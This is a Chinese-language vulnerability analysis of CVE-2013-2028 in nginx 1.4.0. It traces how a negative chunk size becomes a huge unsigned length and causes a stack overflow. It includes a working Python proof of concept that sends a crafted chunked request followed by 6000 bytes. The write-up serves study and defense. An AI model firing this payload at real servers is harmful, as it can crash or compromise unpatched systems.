## 背景

>  **操作系统** ：ubuntu 18.04 64bit
>
>  **漏洞软件** ：nginx-1.4.0

## 1\. 漏洞补丁信息

从补丁可以认识一个漏洞的触发源。

查看github中的补丁信息[Fixed chunk size parsing. · nginx/nginx@818807d
(github.com)](https://github.com/nginx/nginx/commit/818807d71e3df7ea84ce016a616886f8ae79505b#diff-0984937de1f6dc6d660a9cd58ddd30e4eb997dbc4c63b0bcea5f1494091b77ba)如下：

    
    
    if (ctx->size < 0 || ctx->length < 0) {
            goto invalid;
        }
    
        return rc;
    

可以看到补丁中在`/src/http/ngx_http_parse.c`的`ngx_http_parse_chunked`函数返回值中增加了对变量`ctx->length`和`ctx->size`的
**负值判断**

![](https://image.3001.net/images/20211019/1634612963_616e36e39d01742afc669.png!small)

查看ctx变量的结构体定义,

    
    
    struct ngx_http_chunked_s {
        ngx_uint_t           state;
        off_t                size;
        off_t                length;
    };
    

可以看到`size`和`length`的类型变量是`off_t`，而`off_t`对应了`long int`，是一个 **有符号的变量**
（记住这一点，很重要）。

## 2\. 漏洞触发路径分析

从上一步中可以得到漏洞的根源在于`/src/http/ngx_http_parse.c`的`ngx_http_parse_chunked`函数，与
**负值** 的变量`ctx->length`和`ctx->size`有关，现在开始追踪这两个变量的后续流向。

### 2.1 漏洞复现

 **POC信息**

从互联网可以找到该漏洞的POC如下：

    
    
    import socket
    
    host = "127.0.0.1"
    ip='127.0.0.1'
    
    raw = '''GET / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nConnection: Keep-Alive\r\n\r\n''' % (host)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 80))
    
    data1 = raw
    data1 += "f000000000000060" + "\r\n"
    
    print data1
    s.send(data1)
    
    s.send("B" * 6000)
    s.close()
    

这个POC会发送两次TCP请求数据，第一次是一个HTTP请求:

    
    
    GET / HTTP/1.1
    Host: 127.0.0.1
    Transfer-Encoding: chunked
    Connection: Keep-Alive
    
    f000000000000060
    

第二次是一个超长的"B"字符串。

#####  **chunked HTTP请求**

第一个HTTP请求的特殊之处在于这是一个 _分块传输的请求_ 。在请求体中，在每一个分块的开头需要添加当前分块的 **长度**
，以十六进制的形式表示，后面紧跟着 '`\r\n`' ，之后是分块本身，后面也是'`\r\n`'

![](https://image.3001.net/images/20211019/1634612964_616e36e449fbf8b774664.png!small)

#####  **漏洞复现**

在shell中找到nginx工作进程的pid，并使用gdb 挂载调试 ，并在patch函数下断点。

    
    
    osboxes@osboxes:~$ ps aux |grep nginx
    root      2081  0.0  0.0  21860  1908 ?        Ss   11:14   0:00 nginx: master process ./nginx -c conf/nginx.conf
    nobody    7185  0.0  0.0  22256  2196 ?        S    17:32   0:00 nginx: worker process
    osboxes   7406  0.0  0.0  14436  1008 pts/0    S+   19:13   0:00 grep --color=auto nginx
    osboxes@osboxes:~$ sudo gdb -p 7185
    pwndbg> b ngx_http_parse_chunked
    Breakpoint 1 at 0x5599fb464871: file src/http/ngx_http_parse.c, line 1974.
    pwndbg> c
    Continuing.
    

执行POC，并查看函数调用栈可以看到如下：

![](https://image.3001.net/images/20211019/1634612965_616e36e520a6ec22df58a.png!small)

那我们就依照源码来分析漏洞的触发路径

#### 1.`ngx_http_parse_chunked`函数解析HTTP中的块大小

查看`ngx_http_parse_chunked`函数，可以看到该函数的主要功能为解析HTTP请求体中的chunk信息。

    
    
    ngx_int_t
    ngx_http_parse_chunked(ngx_http_request_t *r, ngx_buf_t *b,
        ngx_http_chunked_t *ctx)
    {
    ...
        state = ctx->state;
    ...
        rc = NGX_AGAIN;
    ...
    
            switch (state) {
                    ...
            case sw_chunk_size:
                if (ch >= '0' && ch <= '9') {
                    ctx->size = ctx->size * 16 + (ch - '0');
                    break;
                }
                c = (u_char) (ch | 0x20);
    
                if (c >= 'a' && c <= 'f') {
                    ctx->size = ctx->size * 16 + (c - 'a' + 10);
                    break;
                }
                    ...
        }
    
    data:
        switch (state) {
    ...
        case sw_chunk_data:
            ctx->length = ctx->size + 4 /* LF "0" LF LF */;
            break;
    ...
        return rc;
    ...
    }
    

当遇到HTTP请求体中的 **块大小** ，即`f000000000000060`时，会将字符串解析为对应的 **十六进制数字**
，并保存在`ctx->size`中。注意，由于是有 **符号** 的，ctx的值是为 **负数**
的。之后`ctx->size`的值会赋值到`ctx->lenth`中，也就是：

    
    
    ctx->lenth= ctx->size+4
              = parseLong('f000000000000060')+4
              = -1152921504606846880+4
              = -1152921504606846876
    

之后，函数返回，返回值为`rc=NGX_AGIN`

#### 2.`ngx_http_discard_request_body_filter`将值进一步向上传递

![](https://image.3001.net/images/20211019/1634612966_616e36e618dd0f6875feb.png!small)

根据返回值`rc == NGX_AGAIN`, 这个负值会进一步传递到`r->headers_in.content_length_n
`变量中，注意这也是一个off_t类型的，也就是它也是**负数。**也就是

    
    
    r->headers_in.content_length_n = rb->chunked->length
                                   = -1152921504606846876
    

之后函数返回 ，返回值为`NGX_OK`。

#### 3.`ngx_http_discard_request_body`简单跳转

在`ngx_http_discard_request_body`函数中, 控制流返回后进入到另一个子函数中。

![](https://image.3001.net/images/20211019/1634612966_616e36e6d46d4aff14f8b.png!small)

#### 4.`ngx_http_read_discarded_request_body`栈溢出

###### 逃脱ngx_min检查

在`ngx_http_read_discard_request_body`函数中本来是有
_长度范围检查_`ngx_min`，但是正如我们前面所说的，长度为负数，所以这个检查就被绕过了

![](https://image.3001.net/images/20211019/1634612967_616e36e75e5094af685bc.png!small)

###### size 被赋予超大值

在函数中`size_t`是一个 **无符号** 的long int, 这样size就被意外的赋值为一个超大的数值。也就是

    
    
    (size_t) size= r->headers_in.content_length_n
                 = 17293822569102704740
    

###### recv 将超长的输入写入局部变量buffer

在解析size之后，nginx 会尝试再次读取输入，

    
    
    n = r->connection->recv(r->connection, buffer, size);
    

此时，系统会尝试size=17293822569102704740大小的输入写入到局部变量buffer中，由此造成了 **栈溢出** 。

## 3\. 漏洞路径

![image](https://image.3001.net/images/20211022/1634874042_617232ba50b9f1f25fe6d.png!small)

## 4\. 漏洞数据流

总结整理数据的流动方向如下图：

![](https://image.3001.net/images/20211019/1634612968_616e36e83431c487c22da.png!small)

## 总结

这个漏洞的原因在于， **带符号整数在转为无符号数时会变为极大的值** ，从而导致nginx从socket中读取了超长的值到局部变量中。

漏洞的触发条件为三个：

条件| 作用  
---|---  
HTTP 请求头中 Transfer-Encoding: chunked| 确保进入`ngx_http_parse_chunked`函数，读取精心设置的长度  
块长度为负数| 确保逃过`ngx_min`的检查  
第二次请求超长| 确保数据被读入并造成栈溢出（ps: 这也是利用构造的地方）  
  
参考：[Nginx栈溢出分析 - CVE-2013-2028 - l3m0n - 博客园
(cnblogs.com)](https://www.cnblogs.com/iamstudy/articles/nginx_CVE-2013-2028_brop.html)

